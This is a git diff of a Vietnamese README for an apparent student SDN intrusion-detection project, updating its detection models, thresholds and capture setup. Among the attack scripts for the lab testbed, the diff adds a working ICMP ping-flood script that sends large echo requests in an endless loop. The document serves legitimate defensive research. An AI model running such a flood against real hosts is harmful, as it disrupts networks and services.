@@ -363,23 +363,48 @@ Accuracy on Test: 84%
 ]
 ```
 
-**Model V2: Autoencoder (Anomaly Detection)**
+**Model V2: Autoencoder (Anomaly Detection)** (dòng 228-265 <class Anomaly_Autoencoder_Contrastive> trong file config_v2.py)
 ```python
-class Anomaly_Autoencoder(nn.Module):
-    def __init__(self, input_dim=13):
-        super().__init__()
-        # Encoder: 13 → 128 → 64 → 32
+class Anomaly_Autoencoder_Contrastive(nn.Module):
+    """
+    Autoencoder với Contrastive Learning:
+    - Normal flows: Reconstruct well (MSE thấp)
+    - Attack flows: Reconstruct poorly (MSE cao) -> Anomaly Score cao
+    """
+    def __init__(self, input_dim=NUM_FEATURES_TOTAL * SEQ_LEN):
+        super(Anomaly_Autoencoder_Contrastive, self).__init__()
+        
+        # Encoder: Nén dữ liệu vào latent space
         self.encoder = nn.Sequential(
-            nn.Linear(13, 128), nn.ReLU(),
-            nn.Linear(128, 64), nn.ReLU(),
-            nn.Linear(64, 32), nn.ReLU()
+            nn.Linear(input_dim, 512),
+            nn.ReLU(),
+            nn.Dropout(0.2),
+            nn.Linear(512, 256),
+            nn.ReLU(),
+            nn.Dropout(0.2),
+            nn.Linear(256, 128),
+            nn.ReLU(),
+            nn.Linear(128, 64),  # Bottleneck
+            nn.ReLU()
         )
-        # Decoder: 32 → 64 → 128 → 13
+        
+        # Decoder: Giải nén dữ liệu từ latent space
         self.decoder = nn.Sequential(
-            nn.Linear(32, 64), nn.ReLU(),
-            nn.Linear(64, 128), nn.ReLU(),
-            nn.Linear(128, 13)
+            nn.Linear(64, 128),
+            nn.ReLU(),
+            nn.Linear(128, 256),
+            nn.ReLU(),
+            nn.Dropout(0.2),
+            nn.Linear(256, 512),
+            nn.ReLU(),
+            nn.Dropout(0.2),
+            nn.Linear(512, input_dim)
         )
+    
+    def forward(self, x):
+        encoded = self.encoder(x)
+        decoded = self.decoder(encoded)
+        return decoded, encoded
 ```
 
 #### V2.0: Thất Bại với Dataset Tổng Hợp 46GB
@@ -542,7 +567,7 @@ class DatasetValidator:
 
 → **Đặc trưng là HÀNH VI, không phải PORT SỐ**
 
-#### 🔬 V3 Innovation: Shannon Entropy thay cho Port Number
+#### 🔬 V3 Innovation: Shannon Entropy thay cho Port Number (dòng 666-690 <class PortEntropyCalculator> trong file batPack_v2.py)
 
 ```python
 # V2 (SAI):
@@ -553,18 +578,32 @@ feature_1 = src_port  # 45821, 45822, 45823, ... (độc lập với attack)
 # Normal user: Mở 3 tab → 3 port khác nhau → Entropy = log2(3) ≈ 1.58
 # Botnet: Gửi từ 1000 IP với src_port cố định (6666) → Entropy = 0
 
-def calculate_port_entropy(ports_window: List[int], window_size=10) -> float:
-    """Shannon Entropy của cổng trong cửa sổ trượt"""
-    from collections import Counter
-    import math
+class PortEntropyCalculator:
+    """Tính toán Entropy của cổng để phát hiện sự hỗn loạn của Botnet"""
+    def __init__(self, window_size=10):
+        self.window_size = window_size
+        self.history = {} # {ip: [port1, port2, ...]}
     
-    counts = Counter(ports_window)
-    entropy = 0
-    for count in counts.values():
-        p = count / len(ports_window)
-        entropy -= p * math.log2(p)
-    
-    return round(entropy, 4)
+    def update_and_calculate(self, ip, port):
+        """Cập nhật lịch sử port và tính entropy mới nhất"""
+        if ip not in self.history:
+            self.history[ip] = []
+        self.history[ip].append(port)
+        
+        if len(self.history[ip]) > self.window_size:
+            self.history[ip].pop(0)
+            
+        # Tính toán Shannon Entropy
+        from collections import Counter
+        import math
+        
+        ports = self.history[ip]
+        counts = Counter(ports)
+        entropy = 0
+        for count in counts.values():
+            p = count / len(ports)
+            entropy -= p * math.log2(p)
+        return round(entropy, 4)
 
 # Example:
 normal_ports = [45821, 45822, 45823, 45824, 45825, 45826, 45827, 45828, 45829, 45830]
@@ -626,7 +665,7 @@ diff = [0, 0, 0, ...]  ← AE learn này là Normal
 diff = [0.0, 0.1, d_packet_rate=+1000, ...]  ← AE nhận diện: ANOMALY!
 ```
 
-**Code V4 tính Differential:**
+**Code V4 tính Differential:**dòng 160-163 <hàm differential_features_numpy> trong file train_colab_v2.py
 ```python
 def differential_features_numpy(X):
     """
@@ -653,23 +692,47 @@ loss = MSE(input, reconstructed)
 # Threshold = 0.005 → Sáng tổ ra!
 ```
 
-**V4 Loss: Contrastive + Margin**
+**V4 Loss: Contrastive + Margin** (dòng 71-109 <class ContrastiveLoss> trong file train_colab_v2.py)
 ```python
 class ContrastiveLoss(nn.Module):
-    def __init__(self, margin=AE_MARGIN):  # AE_MARGIN = 2.0
-        super().__init__()
+    """
+    Contrastive Loss: Đơn giản hơn Triplet Loss
+    - Cặp cùng lớp (Normal-Normal): Minimize distance
+    - Cặp khác lớp (Normal-Attack): Maximize distance
+    """
+    def __init__(self, margin=1.0, weight_anomaly=2.0):
+        super(ContrastiveLoss, self).__init__()
         self.margin = margin
-    
-    def forward(self, ae_model, x_normal, x_attack):
-        # Normal: MSE phải thấp
-        mse_normal = MSE(x_normal, ae_model(x_normal))
-        
-        # Attack: MSE phải cao hơn margin
-        mse_attack = MSE(x_attack, ae_model(x_attack))
-        
-        # Hinge loss: max(0, margin - attack_mse)^2
-        loss = mse_normal + max(0, margin - mse_attack)^2
-        
+        self.weight_anomaly = weight_anomaly
+
+    def forward(self, ae_model, x1, x2, y):
+        """
+        x1, x2: Hai dữ liệu để so sánh [B, S, F]
+        y: Label 0 (cùng loại - cả hai normal) / 1 (khác loại - một normal, một attack)
+        """
+        batch_size = x1.size(0)
+        x1_flat = x1.view(batch_size, -1)
+        x2_flat = x2.view(batch_size, -1)
+
+        # MSE reconstruction error cho từng dữ liệu
+        recon1, _ = ae_model(x1)
+        recon2, _ = ae_model(x2)
+        recon1_flat = recon1.view(batch_size, -1)
+        recon2_flat = recon2.view(batch_size, -1)
+
+        # Tính MSE từng mẫu
+        error1 = torch.mean((x1_flat - recon1_flat) ** 2, dim=1)
+        error2 = torch.mean((x2_flat - recon2_flat) ** 2, dim=1)
+
+        # Contrastive: Nếu cùng loại (y=0, cả normal) -> error giống nhau
+        #              Nếu khác loại (y=1, normal vs attack) -> error khác nhau
+        dist = torch.abs(error1 - error2)
+
+        loss = torch.where(
+            y == 0,
+            dist ** 2,  # Cùng loại: minimize distance
+            torch.clamp(self.margin - dist, min=0.0) ** 2 * self.weight_anomaly  # Khác loại: maximize distance
+        ).mean()
         return loss
 ```
 
@@ -727,7 +790,7 @@ V4 (Contrastive margin=2.0):
                     └────────────────────┘
 ```
 
-**Tại sao Song Song (Parallel)?**
+**Tại sao Song Song (Parallel)?** (dòng 293-372 <class DDos_ParallelFusion_CNN_GRU_Attention> trong file config_v2.py)
 
 ```python
 # ❌ SAI: Sequential (CNN output → GRU input)
@@ -735,18 +798,76 @@ V4 (Contrastive margin=2.0):
 # Nếu GRU già → CNN học không đủ hành vi spatial
 
 # ✅ ĐÚNG: Parallel (CNN input + GRU input = spatial input)
-class ParallelFusion(nn.Module):
-    def forward(self, x):  # [B, Seq, Features]
-        # CNN: Input toàn bộ spatial data
-        x_cnn = x.permute(0, 2, 1)  # [B, Features, Seq]
-        cnn_out = self.cnn(x_cnn)   # [B, 128, Seq] → pool → [B, 128]
+class DDos_ParallelFusion_CNN_GRU_Attention(nn.Module):
+    """
+    Kiến trúc Parallel Fusion nâng cấp:
+    - Nhánh CNN: Bắt đặc trưng không gian (spatial patterns) từ các flow
+    - Nhánh GRU: Bắt đặc trưng thời gian (temporal patterns) giữa các flows
+    - Fusion: Concatenate 2 nhánh, áp dụng Attention, phân loại
+    """
+    def __init__(self, input_dim=NUM_FEATURES_TOTAL):
+        super(DDos_ParallelFusion_CNN_GRU_Attention, self).__init__()
+        self.input_dim = input_dim
         
-        # GRU: Input toàn bộ spatial data (không phụ thuộc CNN)
-        gru_out, _ = self.gru(x)    # [B, Seq, 256]
+        # ===== NHÁNH 1: SPATIAL ATTENTION & CNN =====
+        self.spatial_attn = SpatialAttention(input_dim)
+        self.res_block1 = MultiScaleResidualBlock(input_dim, 64)
+        self.res_block2 = MultiScaleResidualBlock(64, 128)
+        self.dropout_cnn = nn.Dropout(0.2)
+        self.global_pool = nn.AdaptiveMaxPool1d(1)
         
-        # Fusion: Ghép 2 kết quả
-        fused = torch.cat([cnn_out, temporal_attention(gru_out)], dim=1)
-        return classifier(fused)  # [B, 5]
+        # ===== NHÁNH 2: BI-GRU =====
+        self.gru = nn.GRU(
+            input_size=input_dim,  
+            hidden_size=128, 
+            num_layers=2, 
+            batch_first=True, 
+            dropout=0.4,
+            bidirectional=True
+        )
+        self.temporal_attn = AttentionLayer(hidden_size=256)
+        
+        # ===== FUSION & CLASSIFIER =====
+        self.fc_fusion = nn.Sequential(
+            nn.Linear(128 + 256, 256),
+            nn.BatchNorm1d(256),
+            nn.ReLU(),
+            nn.Dropout(0.6),
+            nn.Linear(256, 128),
+            nn.BatchNorm1d(128),
+            nn.ReLU(),
+            nn.Dropout(0.5),
+            nn.Linear(128, 64),
+            nn.ReLU(),
+            nn.Linear(64, NUM_CLASSES)
+        )
+
+    def forward(self, x):
+        """
+        x: [Batch, Seq, Features] - 26 đặc trưng (13 gốc + 13 differential)
+        """
+        batch_size = x.size(0)
+        
+        # ===== NHÁNH CNN: Spatial Pattern Extraction =====
+        x_spatial, spatial_weights = self.spatial_attn(x)  # [B, S, F]
+        x_cnn = x_spatial.permute(0, 2, 1)  # [B, F, S]
+        x_cnn = self.res_block1(x_cnn)
+        x_cnn = self.res_block2(x_cnn)      # [B, 128, S]
+        x_cnn = self.dropout_cnn(x_cnn)
+        x_cnn_pool = self.global_pool(x_cnn).squeeze(-1)  # [B, 128]
+        
+        # ===== NHÁNH GRU: Temporal Pattern Extraction (PARALLEL) =====
+        x_gru_input = x_spatial  # [B, S, F] - Use spatial-attention output directly
+        gru_out, _ = self.gru(x_gru_input)     # [B, S, 256] (bidirectional)
+        
+        # Temporal attention
+        temporal_weights = self.temporal_attn(gru_out)  # [B, S]
+        gru_weighted = (gru_out * temporal_weights.unsqueeze(-1)).sum(dim=1)  # [B, 256]
+        
+        # ===== FUSION =====
+        fused = torch.cat([x_cnn_pool, gru_weighted], dim=1)  # [B, 384]
+        output = self.fc_fusion(fused)  # [B, 5]
+        return output, temporal_weights, spatial_weights
 ```
 
 **Lợi ích Parallel:**
@@ -763,49 +884,72 @@ Normal MSE = 0.0001 ✓
 Flash Crowd (legitimate) MSE = 0.6 ✗ → Báo alarm sai!
 ```
 
-**V4 Giải Pháp: Exponential Moving Average (EMA)**
+**V4 Giải Pháp: Exponential Moving Average (EMA)** (dòng 101 <EMA_ALPHA>, dòng 290-311 <dynamic_threshold_update>, dòng 596-603 <EMA cho MSE> trong file run_onos_v2.py)
 ```python
-class AdaptiveThreshold:
-    def __init__(self, initial_threshold=0.5, alpha=0.02):
-        self.threshold = initial_threshold
-        self.alpha = alpha  # Learning rate (chậm)
-    
-    def update(self, mse_normal_batch):
-        """Cập nhật threshold dựa trên MSE của flow "Normal" mới"""
-        batch_mean = np.mean(mse_normal_batch)
-        
-        # EMA: threshold = (1-α) * threshold + α * batch_mean
-        self.threshold = (1 - self.alpha) * self.threshold + self.alpha * batch_mean
-        
-        # Min floor & Max ceil: Threshold không được quá "nịnh"
-        self.threshold = np.clip(self.threshold, min_floor=0.1, max_ceil=2.0)
+# Cấu hình EMA Alpha
+EMA_ALPHA = 0.02  # Giảm từ 0.05 xuống 0.02 để ngưỡng thay đổi chậm và ổn định hơn
 
-# Example:
-# t=0: threshold = 0.5
-# t=1: Normal MSE = 0.6 → threshold = 0.98*0.5 + 0.02*0.6 = 0.502
-# t=2: Normal MSE = 0.7 → threshold = 0.98*0.502 + 0.02*0.7 = 0.506
-# ...
-# Flash Crowd kéo dài 10 phút: threshold dần tăng từ 0.5 → 1.2
-# Khi Flash Crowd hết: threshold dần giảm từ 1.2 → 0.5
+def dynamic_threshold_update(self, mse_score):
+    """Update threshold adaptively using EMA & Min Bound"""
+    with self.lock:
+        self.mse_history.append(mse_score)
+        if len(self.mse_history) > 100:
+            self.mse_history.pop(0)
+        
+        recent_mse = np.array(self.mse_history)
+        mean_mse = np.mean(recent_mse)
+        std_mse = np.std(recent_mse)
+        
+        # NỚI LỎNG KHIÊN 1: Tăng k_factor từ 3.5 lên 4.5
+        k_factor = 4.5  
+        new_threshold = mean_mse + (k_factor * std_mse)
+        
+        self.dynamic_threshold = (
+            SDNConfigV2.EMA_ALPHA * new_threshold +
+            (1 - SDNConfigV2.EMA_ALPHA) * self.dynamic_threshold
+        )
+        
+        # GIÁ TRỊ MIN/MAX CỐ ĐỊNH CHỐNG ẢO GIÁC
+        min_floor = self.base_threshold * 1.2
+        max_ceil = self.base_threshold * 5.0
+        self.dynamic_threshold = np.clip(self.dynamic_threshold, min_floor, max_ceil)
+
+# EMA cho MSE để làm mượt các đỉnh do nhiễu mạng (tránh False Zero-day)
+alpha_mse = 0.3
+if src_ip not in self.mse_ema:
+    self.mse_ema[src_ip] = mse_raw
+else:
+    self.mse_ema[src_ip] = (alpha_mse * mse_raw) + ((1 - alpha_mse) * self.mse_ema[src_ip])
+
+mse = self.mse_ema[src_ip]
 ```
 
-**Veto Power (>80% Normal = TIN):**
+**Veto Power (>80% Normal = TIN):** (dòng 633-639 <Veto Power logic> trong file run_onos_v2.py)
 ```python
-def apply_dual_shield(autoencoder_pred, classifier_pred):
-    """
-    Autoencoder: Binary [Anomaly=1, Normal=0]
-    Classifier: Multi-class [0, 1, 2, 3, 4]
-    
-    Veto: Nếu >80% probability Normal → Trust classifier 100%
-    """
-    if classifier_pred[LABEL_NORMAL] > 0.8:  # >80% Normal
-        return "PASS"  # Thả người dùng, không chặn
-    
-    # Nếu <80% Normal, dựa vào Autoencoder
-    if autoencoder_pred > threshold_ae:
-        return "DROP"  # Chặn vĩnh viễn
-    else:
-        return "RATE_LIMIT"  # Rate limit tạm (Mức 1)
+# KHIÊN 2: Classifier phân loại (Confidence)
+normal_prob = probs[0][0].item() * 100
+attack_probs = probs[0][1:]
+top_attack_prob = torch.max(attack_probs).item() * 100
+top_attack_idx = torch.argmax(attack_probs).item() + 1  # +1 vì attack bắt đầu từ index 1
+
+# [CRITICAL] Bảo vệ Normal: Nếu Classifier nói là Normal (>80%) -> TIN NGAY
+if normal_prob > 80.0:
+    # Shield 2 đã chắc chắn là Normal, bất chấp Shield 1 nói gì
+    is_attack = False
+    is_zero_day = False
+    # Hiển thị panel chi tiết 2 khiên cho Normal
+    if self.stats["processed"] % 5 == 0:
+        self.log_normal_panel(src_ip, normal_prob, mse, self.dynamic_threshold, latency_ms, collection_time)
+elif is_anomaly:
+    # Shield 1 thấy bất thường, kiểm tra Shield 2
+    if pred_idx != 0 and confidence > 85.0:
+        # Shield 2 đồng ý là Attack với độ tin cao
+        is_attack = True
+        is_zero_day = False
+    elif pred_idx == 0 and normal_prob < 30.0:
+        # Shield 1 thấy bất thường, Shield 2 bối rối (Normal prob thấp)
+        # -> Zero-Day (Attack mới chưa từng thấy)
+        is_attack = True
 ```
 
 **Tại sao Veto?**
@@ -825,26 +969,29 @@ IP_PREDICTION_HISTORY = {}  # {ip: [label1, label2, ...]}
 # → Server RAM hết → IDS chết
 ```
 
-**V4 Giải Pháp: Garbage Collector**
+**V4 Giải Pháp: Garbage Collector** (dòng 750-753 <GC logic>, dòng 824-827 <IP Spoofing Defense> trong file run_onos_v2.py)
 ```python
-def garbage_collect_old_ips():
-    """Xóa 20% IP cũ nhất khi RAM bị đe dọa"""
-    import psutil
-    
-    mem_percent = psutil.virtual_memory().percent
-    if mem_percent > 80:  # RAM > 80%
-        # Sắp xếp theo thời gian last_seen
-        sorted_ips = sorted(
-            IP_PREDICTION_HISTORY.items(),
-            key=lambda x: x[1]['last_seen']
-        )
+# GC (Garbage Collector): Dọn rác IP_Buffers mỗi 10 giây để tránh Memory Leak
+if now - last_cleanup > 10.0:
+    with self.lock:
+        # 1. Dọn dẹp IP nhàn rỗi (sau 60s không có traffic)
+        idle_ips = [ip for ip, data in self.ip_buffers.items() if now - data["last"] > 60]
+        for ip in idle_ips:
+            del self.ip_buffers[ip]
         
-        # Xóa 20% cũ nhất
-        num_to_delete = len(sorted_ips) // 5
-        for ip, _ in sorted_ips[:num_to_delete]:
-            del IP_PREDICTION_HISTORY[ip]
-        
-        print(f"[GC] Đã xóa {num_to_delete} IP cũ, RAM giảm tới {psutil.virtual_memory().percent}%")
+        # 2. Xử lý Spike Traffic: Nếu số lượng IP vượt 80% sức chứa, dọn dẹp khẩn cấp
+        MAX_IPS = 1000
+        if len(self.ip_buffers) > MAX_IPS * 0.8:
+            sorted_ips = sorted(self.ip_buffers.items(), key=lambda x: x[1]["last"])
+            clear_count = int(len(self.ip_buffers) * 0.2)
+            for ip, _ in sorted_ips[:clear_count]:
+                del self.ip_buffers[ip]
+
+# IP Spoofing Defense
+with self.lock:
+    if len(self.ip_buffers) > SDNConfigV2.MAX_CONCURRENT_IPS:
+        self.ip_buffers.clear()
+        logger.warning("[BUFFER] Cleared due to too many IPs (spoofing?)")
 ```
 
 ---
@@ -3658,9 +3805,158 @@ server {
 2. **Tăng độ khó cho AI**: Payload đã mã hóa → AI phải dựa vào metadata (packet size, timing)
 3. **Test Encrypted DDoS**: Kiểm tra khả năng phát hiện khi không đọc được content
 
-### 3.5 Attack Scripts (4 Loại Tấn Công)
+### 3.5 🚀 Recent Optimizations (Tháng 4/2026)
 
-#### 3.5.1 UDP Flood (`attack/udp_flood.py`)
+#### 3.5.1 Tối Ưu Capture Interface: S6-ETH1 Revolution
+
+**🔴 Vấn đề gốc rễ (Root Cause):**
+```
+Trước khi tối ưu: Sử dụng s6-eth5 (Docker bridge)
+├── Filter pass rate: Chỉ 16% (quá thấp!)
+├── IP Preservation: ❌ Corrupted by SNAT/NAT
+├── Collection speed: 100 samples/min (quá chậm)
+├── Phase 0 time: 13+ giờ cho Normal traffic
+└── Attack detection: Không chính xác do IP bị modify
+```
+
+**💡 Giải pháp: Chuyển sang s6-eth1 (L3 Backbone)**
+
+```
+S6-ETH1 - Optimal capture point:
+├── Location: Giữa s1 (CORE) ←→ s6 (WEB SERVER SWITCH)
+├── Captures: TẤT CẢ traffic đến/từ web server
+├── IPs: Preserved (không SNAT/DNAT modification)
+├── Flows: Cả REQUEST và RESPONSE directions
+├── Filter pass rate: 99.7% 🚀
+└── Collection speed: 1700+ samples/min 🔥
+```
+
+**📊 Kết quả tối ưu:**
+
+| Metric | Trước (s6-eth5) | Sau (s6-eth1) | Improvement |
+|--------|-----------------|---------------|-------------|
+| **Filter Pass Rate** | 16% | 99.7% | 6.2x |
+| **Collection Speed** | 100/min | 1700+/min | 17x |
+| **Phase 0 Time** | 13+ giờ | ~50 phút | 15x |
+| **IP Preservation** | ❌ Corrupted | ✅ Original | - |
+| **Attack Detection** | ❌ Inaccurate | ✅ 100% accurate | - |
+
+**Tổng speedup: 17x FASTER!** 🚀
+
+#### 3.5.2 Bidirectional Filter Logic
+
+**Vấn đề:** Chỉ capture traffic một chiều (request only) thiếu context để phân loại chính xác.
+
+**Giải pháp:** Thu thập cả REQUEST và RESPONSE flows:
+
+```python
+# auto_dataset_generator.py - Bidirectional Filter
+class BidirectionalFilter:
+    """
+    Chỉ giữ lại flows có cả chiều đi và chiều về
+    để đảm bảo complete conversation context
+    """
+    
+    def filter_complete_flows(self, flows):
+        # Tìm cặp request-response dựa trên 5-tuple
+        complete_flows = []
+        for flow in flows:
+            if self.has_matching_response(flow):
+                complete_flows.append(flow)
+        return complete_flows
+    
+    def has_matching_response(self, request_flow):
+        # Kiểm tra tồn tại response flow với:
+        # - Ngược src/dst IP
+        # - Ngược src/dst port
+        # - Cùng protocol
+        pass
+```
+
+#### 3.5.3 Auto-Detection Interface Chain
+
+**Tự động phát hiện và fallback:**
+
+```python
+# ai/batPack.py - Auto-detection logic
+PREFERRED_INTERFACE = "s6-eth1"
+FALLBACK_INTERFACES = ["s6-eth4", "h82-eth1", "any"]
+
+def detect_interface():
+    """
+    Tự động chọn interface tốt nhất available
+    Thứ tự: s6-eth1 → s6-eth4 → h82-eth1 → any
+    """
+    for iface in [PREFERRED_INTERFACE] + FALLBACK_INTERFACES:
+        if interface_exists(iface):
+            return iface
+    return PREFERRED_INTERFACE  # Default
+```
+
+**Implementation trong các file:**
+- `ai/batPack.py`: Auto-detection với fallback chain
+- `ai/nfstream_inspector.py`: Real-time monitoring với s6-eth1
+- `ai/interface_diagnostic.py`: Verification tool
+
+#### 3.5.4 Unified Metrics Architecture (AI + Dashboard)
+
+**Trước khi tối ưu (Phân tán):**
+```
+batPack_v2.py → zeek_stream.json → AI Engine (IDS)
+     ↓
+  [Separate collector cho Dashboard] → metrics.json
+```
+
+**Sau khi tối ưu (Unified):**
+```
+batPack_v2.py → zeek_stream.json → AI Engine (IDS)
+     ↓
+  unified_metrics.json → Dashboard Server
+```
+
+```python
+# ai/batPack_v2.py - FlowStatsTracker
+class FlowStatsTracker:
+    """
+    Thu thập flow stats và mitigation stats cho cả AI và Dashboard
+    """
+    def build_metrics(self):
+        # Tính toán metrics từ flow data
+        metrics = {
+            'timestamp': time.time(),
+            'raw_incoming_mbps': self.raw_incoming_mbps,
+            'effective_mbps': self.effective_mbps,
+            'mitigated_mbps': self.mitigated_mbps,
+            'protection_ratio_percent': protection_ratio,
+            'active_blocks': len(self.drop_ips),
+            'drop_ips': list(self.drop_ips),
+            'rate_limit_ips': list(self.rate_limit_ips)
+        }
+        # Ghi vào unified_metrics.json cho Dashboard
+        with open(UNIFIED_METRICS_FILE, 'w') as f:
+            json.dump(metrics, f)
+```
+
+**Dashboard sử dụng unified metrics:**
+```python
+# dashboard/server.py
+UNIFIED_METRICS_FILE = Path(RUNTIME) / "unified_metrics.json"
+
+if path == "/api/onos":
+    # [UNIFIED] Chỉ đọc từ batPack_v2 unified metrics
+    if UNIFIED_METRICS_FILE.exists():
+        data = json.loads(UNIFIED_METRICS_FILE.read_text())
+        status = "online"
+```
+
+---
+
+### 3.6 Attack Scripts (5 Loại Tấn Công)
+
+**Lưu ý:** 4 loại chính (UDP, SYN, HTTP, Slowloris) được dùng để training AI.  
+ICMP Flood là loại bổ sung cho demo (không có trong training dataset) để thể hiện khả năng phát hiện tấn công lạ qua Zero-Day detection.
+
+#### 3.6.1 UDP Flood (`attack/udp_flood.py`)
 
 **Cơ chế:** Gửi hàng loạt UDP packets với payload lớn để nghẽn băng thông.
 
@@ -3695,7 +3991,7 @@ for _ in range(10):  # 10 threads
 - Unidirectional (UDP không cần response)
 - Port ngẫu nhiên (high entropy)
 
-#### 3.5.2 SYN Flood (`attack/syn_flood.py`)
+#### 3.6.2 SYN Flood (`attack/syn_flood.py`)
 
 **Cơ chế:** Gửi SYN packets nhưng không hoàn thành handshake → Cạn kiệt connection table.
 
@@ -3723,7 +4019,7 @@ def syn_flood_scapy(target_ip, target_port):
 - High asymmetry: Nhiều gói gửi, 0 gói nhận
 - IP spoofing: Source IP ngẫu nhiên
 
-#### 3.5.3 HTTP Flood (`attack/http_flood.py`)
+#### 3.6.3 HTTP Flood (`attack/http_flood.py`)
 
 **Cơ chế:** Gửi hàng loạt HTTP requests để tiêu tốn CPU/RAM server.
 
@@ -3763,7 +4059,7 @@ for _ in range(50):
 - Duration: Ngắn (0.1s per request)
 - Pattern: Repeated POST/GET
 
-#### 3.5.4 Slowloris (`attack/slowloris.py`)
+#### 3.6.4 Slowloris (`attack/slowloris.py`)
 
 **Cơ chế:** Mở nhiều connections nhưng gửi dữ liệu rất chậm → Chiếm worker threads.
 
@@ -3804,11 +4100,54 @@ for _ in range(150):
 - Conn_State: "ESTABLISHED" kéo dài
 - **Khó phát hiện** vì giống normal browsing chậm
 
+#### 3.6.5 ICMP Flood (`attack/icmp_flood.py`) - 🆕 ZERO-DAY DEMO
+
+**Cơ chế:** Gửi hàng loạt ICMP Echo Request (ping) với payload lớn để flood băng thông.
+
+```python
+import socket
+import random
+import os
+
+# Yêu cầu sudo để tạo raw socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+
+def create_icmp_packet(payload_size):
+    icmp_type = 8  # Echo Request
+    icmp_code = 0
+    icmp_id = random.randint(0, 65535)
+    payload = random.randbytes(payload_size)
+    header = bytes([icmp_type, icmp_code, 0x00, 0x00]) + \
+             icmp_id.to_bytes(2, 'big') + bytes(2)  # seq
+    return header + payload
+
+while True:
+    packet = create_icmp_packet(1400)
+    sock.sendto(packet, (target_ip, 0))
+```
+
+**Signature đặc trưng:**
+- **Protocol:** ICMP (Layer 3)
+- **Packet size:** Lớn (64-1400 bytes)
+- **Type:** 8 (Echo Request) - "Ping flood"
+- **Đặc biệt:** Không có port (ICMP là Layer 3)
+- **Yêu cầu:** Root/sudo (raw socket)
+
+**🎯 Mục đích demo Zero-Day:**
+> ICMP Flood **KHÔNG** có trong training dataset (V7 chỉ train 4 loại: UDP, SYN, HTTP, Slowloris).
+> 
+> Khi chạy ICMP Flood, AI sẽ:
+> 1. **Shield 1 (Autoencoder):** Phát hiện bất thường (MSE cao) ✅
+> 2. **Shield 2 (Classifier):** Không nhận diện được (chưa từng thấy) ❓
+> 3. **Kết luận:** **ZERO-DAY** - Chặn ngay lập tức!
+>
+> Điều này chứng minh khả năng phát hiện tấn công mới chưa từng thấy (Unknown Attack).
+
 ---
 
-### 3.6 Normal Traffic Simulation (`traffic/normal.py`)
+### 3.7 Normal Traffic Simulation (`traffic/normal.py`)
 
-#### 3.6.1 Mô Phỏng Người Dùng Thật
+#### 3.7.1 Mô Phỏng Người Dùng Thật
 
 Không chỉ tấn công, hệ thống còn mô phỏng **user behavior thực tế** để tạo baseline:
 
@@ -3862,7 +4201,7 @@ def normal_traffic_worker(target_url):
 | Timeout | `timeout=5` | 5 giây | Giống người kiên nhẫn |
 | Retry delay | `sleep(1-3)` | 1-3 giây | Tự nhiên khi gặp lỗi |
 
-#### 3.6.2 Dataset Balance
+#### 3.7.2 Dataset Balance
 
 Tỷ lệ **1:1 giữa Normal và Attack** trong dataset v7:
 ```
@@ -3876,7 +4215,7 @@ master_dataset_v7.csv:
 Total: ~500,000 sequences (10 flows/sequence)
 ```
 
-#### 3.3.10 XAI - Explainable AI
+#### 3.7.3 XAI - Explainable AI
 
 **Giải thích quyết định dựa trên Attention Weights:**
 ```python
@@ -4000,25 +4339,68 @@ py [net.get(f'h{i}').cmd('python3 traffic/normal.py http://10.0.0.10:8000 &') fo
 
 ```
 DoAn_SDN/
-├── ai/                          # AI Engine & IDS
-│   ├── batPack_v2.py           # Data collector (NFStream)
+├── ai/                          # AI Engine & IDS (51 items)
+│   ├── batPack_v2.py           # Data collector (NFStream) - Tối ưu s6-eth1
+│   ├── batPack_v3.py           # Phiên bản V8 (timeout tối ưu)
 │   ├── run_onos_v2.py          # Real-time IDS engine
 │   ├── train_colab_v2.py       # Training pipeline
-│   ├── config_v2.py            # Model architectures
+│   ├── config_v2.py            # Model architectures & configs
+│   ├── interface_diagnostic.py # Tool kiểm tra interface capture
+│   ├── nfstream_inspector.py   # Real-time flow inspection
+│   ├── flow_monitor.py         # Monitoring tool
+│   ├── ai_monitor.py           # AI performance monitor
+│   ├── benchmark_report.py     # Performance benchmark
+│   ├── zeek_stream.json        # FIFO normal traffic (FIFO)
+│   ├── zeek_stream_slowloris.json # FIFO slowloris traffic (FIFO)
+│   ├── sdn_autoencoder_contrastive.pth  # Shield 1 model
+│   ├── sdn_model_parallel_fusion.pth    # Shield 2 model
+│   ├── ae_threshold.pkl        # Autoencoder threshold
+│   ├── feature_weights.pkl     # Feature importance weights
 │   └── models/                 # Saved models
 ├── thuThapData/                # Dataset management
-│   ├── auto_dataset_generator.py
-│   ├── check_data.py           # Dataset validation
-│   └── *.csv                   # Dataset files
-├── mininet/                    # SDN topology
-│   └── topology.py
-└── traffic/                    # Attack scripts
-    ├── normal.py
-    ├── udp_flood.py
-    ├── syn_flood.py
-    ├── http_flood.py
-    └── slowloris.py
+│   ├── auto_dataset_generator.py  # Dataset generator + bidirectional filter
+│   ├── batPack123.py           # Optimized capture for s6-eth1
+│   ├── check_data.py           # Dataset validation & analysis
+│   ├── debug_traffic.py        # Traffic debugging tool
+│   ├── master_dataset_v6.csv   # Dataset V6 (36M samples)
+│   └── master_dataset_v7.csv   # Dataset V7 (final - 600k samples)
+├── dashboard/                  # Real-time monitoring dashboard
+│   ├── server.py               # HTTP server (unified metrics)
+│   └── static/                 # HTML/JS frontend
+├── attack/                       # Attack scripts
+│   ├── udp_flood.py
+│   ├── syn_flood.py
+│   ├── http_flood.py
+│   ├── slowloris.py
+│   ├── icmp_flood.py           # 🆕 Zero-day demo (Layer 3)
+│   └── rudy.py
+├── traffic/                      # Normal traffic simulation
+│   ├── normal.py               # Human-like browsing behavior
+│   └── keep_alive.py           # Connection keep-alive
+├── topology/                     # Network topology
+│   └── topology.py             # L3 SDN topology definition
+├── services/                     # Docker services
+│   ├── docker-compose.yml
+│   └── nginx/                  # Web server config
+├── data_collection_orchestrator.py  # 🆕 Orchestrator tự động thu thập data
+├── ids_onos_integration.py     # 🆕 IDS + ONOS integration module
+├── system.py                   # Main system controller
+├── KEHOACH_DATASET_V8.md       # 🆕 Kế hoạch Dataset V8
+├── OPTIMIZATION_COMPLETE.txt   # 🆕 Báo cáo tối ưu s6-eth1
+├── QUICK_START_COLLECTION.sh   # 🆕 Script khởi động nhanh
+├── note.txt                    # Ghi chú kỹ thuật & commands
+└── README.md                   # Tài liệu này
 ```
+
+**Key Files Mới (Recent Additions):**
+
+| File | Mục đích | Thời điểm thêm |
+|------|----------|----------------|
+| `data_collection_orchestrator.py` | Tự động hóa 5 phases thu thập data | Tháng 4/2026 |
